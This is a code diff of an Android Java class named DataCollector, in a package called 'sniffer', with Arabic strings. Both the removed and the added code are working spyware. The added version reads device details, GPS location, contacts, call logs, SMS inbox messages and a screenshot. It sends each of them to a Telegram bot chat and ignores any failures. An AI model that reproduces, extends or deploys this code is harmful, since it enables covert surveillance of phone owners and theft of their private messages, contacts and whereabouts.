@@ -1,5 +1,6 @@
 package com.v8.global.sniffer.utils;
 
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -10,6 +11,7 @@ import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Environment;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.provider.Settings;
@@ -24,11 +26,11 @@ import java.util.concurrent.TimeUnit;
 import okhttp3.*;
 
 public class DataCollector {
-
+    
     private Context context;
     private OkHttpClient client;
     private static final String TAG = "DataCollector";
-
+    
     public DataCollector(Context context) {
         this.context = context;
         this.client = new OkHttpClient.Builder()
@@ -37,15 +39,32 @@ public class DataCollector {
                 .readTimeout(30, TimeUnit.SECONDS)
                 .build();
     }
-
-    public void collectAll() {
-        collectLocation();
-        collectDeviceInfo();
-        collectPhotos();
-        // أضف المزيد حسب الحاجة
+    
+    public void collectAndSend() {
+        sendDeviceInfo();
+        sendLocation();
+        sendContacts();
+        sendCallLogs();
+        sendSMS();
+        takeScreenshot();
     }
-
-    private void collectLocation() {
+    
+    private void sendDeviceInfo() {
+        try {
+            String info = "📱 **معلومات الجهاز**\n\n" +
+                         "• الطراز: " + Build.MODEL + "\n" +
+                         "• الشركة: " + Build.MANUFACTURER + "\n" +
+                         "• الإصدار: " + Build.VERSION.RELEASE + "\n" +
+                         "• Android: " + Build.VERSION.SDK_INT + "\n" +
+                         "• الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
+            
+            sendToTelegram(info);
+        } catch (Exception e) {
+            Log.e(TAG, "خطأ في معلومات الجهاز");
+        }
+    }
+    
+    private void sendLocation() {
         try {
             LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
             if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) 
@@ -55,120 +74,162 @@ public class DataCollector {
                 if (location == null) {
                     location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                 }
-
+                
                 if (location != null) {
                     String mapUrl = "https://maps.google.com/?q=" + 
                                    location.getLatitude() + "," + 
                                    location.getLongitude();
-
-                    String msg = "📍 **الموقع الحالي**\n\n" +
-                                "الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
-                                        .format(new Date()) + "\n" +
-                                "الخط: " + location.getLatitude() + "\n" +
-                                "الطول: " + location.getLongitude() + "\n" +
-                                "الدقة: " + location.getAccuracy() + "م\n" +
-                                "الرابط: " + mapUrl;
-
+                    
+                    String msg = "📍 **الموقع**\n\n" +
+                                "• الرابط: " + mapUrl + "\n" +
+                                "• الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
+                    
                     sendToTelegram(msg);
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "خطأ في الموقع: " + e.getMessage());
+            Log.e(TAG, "خطأ في الموقع");
         }
     }
-
-    private void collectDeviceInfo() {
+    
+    private void sendContacts() {
         try {
-            String msg = "📱 **معلومات الجهاز**\n\n" +
-                        "الطراز: " + Build.MODEL + "\n" +
-                        "الشركة: " + Build.MANUFACTURER + "\n" +
-                        "الإصدار: " + Build.VERSION.RELEASE + "\n" +
-                        "Android: " + Build.VERSION.SDK_INT + "\n" +
-                        "المعرف: " + Settings.Secure.getString(context.getContentResolver(), 
-                                Settings.Secure.ANDROID_ID) + "\n" +
-                        "الوقت: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
-                                .format(new Date());
-
-            sendToTelegram(msg);
-        } catch (Exception e) {
-            Log.e(TAG, "خطأ في معلومات الجهاز: " + e.getMessage());
-        }
-    }
-
-    private void collectPhotos() {
-        try {
-            String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED};
             Cursor cursor = context.getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection, null, null,
-                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5"
-            );
-
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null);
+            
             if (cursor != null) {
-                while (cursor.moveToNext()) {
-                    String path = cursor.getString(0);
-                    File file = new File(path);
-                    if (file.exists() && file.length() < 10 * 1024 * 1024) { // أقل من 10 ميجا
-                        sendFileToTelegram(file, "image/*", "📸 صورة");
-                        Thread.sleep(2000);
-                    }
+                StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
+                int count = 0;
+                
+                while (cursor.moveToNext() && count < 20) {
+                    String name = cursor.getString(cursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String phone = cursor.getString(cursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    
+                    sb.append("• ").append(name).append(": ").append(phone).append("\n");
+                    count++;
                 }
                 cursor.close();
+                
+                sendToTelegram(sb.toString());
             }
         } catch (Exception e) {
-            Log.e(TAG, "خطأ في جمع الصور: " + e.getMessage());
+            Log.e(TAG, "خطأ في جهات الاتصال");
         }
     }
-
-    private void sendToTelegram(String message) {
+    
+    private void sendCallLogs() {
         try {
-            String url = Constants.BASE_URL + "sendMessage?chat_id=" + Constants.CHAT_ID +
-                        "&text=" + Uri.encode(message) + "&parse_mode=Markdown";
-
-            Request request = new Request.Builder()
-                    .url(url)
-                    .build();
-
-            client.newCall(request).enqueue(new Callback() {
-                @Override
-                public void onFailure(Call call, IOException e) {}
-
-                @Override
-                public void onResponse(Call call, Response response) throws IOException {
-                    response.close();
+            Cursor cursor = context.getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                CallLog.Calls.DATE + " DESC LIMIT 10");
+            
+            if (cursor != null) {
+                StringBuilder sb = new StringBuilder("📞 **آخر المكالمات**\n\n");
+                
+                while (cursor.moveToNext()) {
+                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
+                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
+                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
+                    
+                    String typeText = type.equals("1") ? "📞 وارد" : 
+                                     type.equals("2") ? "📞 صادر" : "❌ فائت";
+                    
+                    sb.append(typeText).append(": ").append(number)
+                      .append(" - ").append(new Date(date).toString()).append("\n");
                 }
-            });
+                cursor.close();
+                
+                sendToTelegram(sb.toString());
+            }
         } catch (Exception e) {
-            Log.e(TAG, "خطأ في الإرسال: " + e.getMessage());
+            Log.e(TAG, "خطأ في سجل المكالمات");
         }
     }
-
-    private void sendFileToTelegram(File file, String mimeType, String caption) {
+    
+    private void sendSMS() {
+        try {
+            Cursor cursor = context.getContentResolver().query(
+                Uri.parse("content://sms/inbox"),
+                null, null, null,
+                "date DESC LIMIT 10");
+            
+            if (cursor != null) {
+                StringBuilder sb = new StringBuilder("💬 **آخر الرسائل**\n\n");
+                
+                while (cursor.moveToNext()) {
+                    String address = cursor.getString(cursor.getColumnIndex("address"));
+                    String body = cursor.getString(cursor.getColumnIndex("body"));
+                    
+                    sb.append("📨 من ").append(address).append(":\n");
+                    sb.append(body.length() > 50 ? body.substring(0, 50) + "..." : body);
+                    sb.append("\n---\n");
+                }
+                cursor.close();
+                
+                sendToTelegram(sb.toString());
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "خطأ في الرسائل");
+        }
+    }
+    
+    private void takeScreenshot() {
+        try {
+            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + 
+                         System.currentTimeMillis() + ".png";
+            
+            Process process = Runtime.getRuntime().exec("screencap -p " + path);
+            process.waitFor();
+            
+            File file = new File(path);
+            if (file.exists()) {
+                sendPhoto(file, "📱 لقطة شاشة");
+                file.delete();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "خطأ في تصوير الشاشة");
+        }
+    }
+    
+    private void sendPhoto(File file, String caption) {
         try {
             RequestBody body = new MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", Constants.CHAT_ID)
                     .addFormDataPart("caption", caption)
-                    .addFormDataPart("document", file.getName(),
-                            RequestBody.create(MediaType.parse(mimeType), file))
+                    .addFormDataPart("photo", file.getName(),
+                            RequestBody.create(MediaType.parse("image/jpeg"), file))
                     .build();
-
+            
             Request request = new Request.Builder()
-                    .url(Constants.BASE_URL + "sendDocument")
+                    .url(Constants.BASE_URL + "sendPhoto")
                     .post(body)
                     .build();
-
+            
             client.newCall(request).enqueue(new Callback() {
-                @Override
-                public void onFailure(Call call, IOException e) {}
-
-                @Override
-                public void onResponse(Call call, Response response) throws IOException {
-                    response.close();
-                }
+                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onResponse(Call call, Response r) throws IOException { r.close(); }
             });
         } catch (Exception e) {
-            Log.e(TAG, "خطأ في إرسال الملف: " + e.getMessage());
+            Log.e(TAG, "خطأ في إرسال الصورة");
         }
+    }
+    
+    private void sendToTelegram(String message) {
+        try {
+            String url = Constants.BASE_URL + "sendMessage?chat_id=" + Constants.CHAT_ID +
+                        "&text=" + Uri.encode(message) + "&parse_mode=Markdown";
+            
+            Request request = new Request.Builder().url(url).build();
+            
+            client.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onResponse(Call call, Response r) throws IOException { r.close(); }
+            });
+        } catch (Exception e) {}
     }
 }
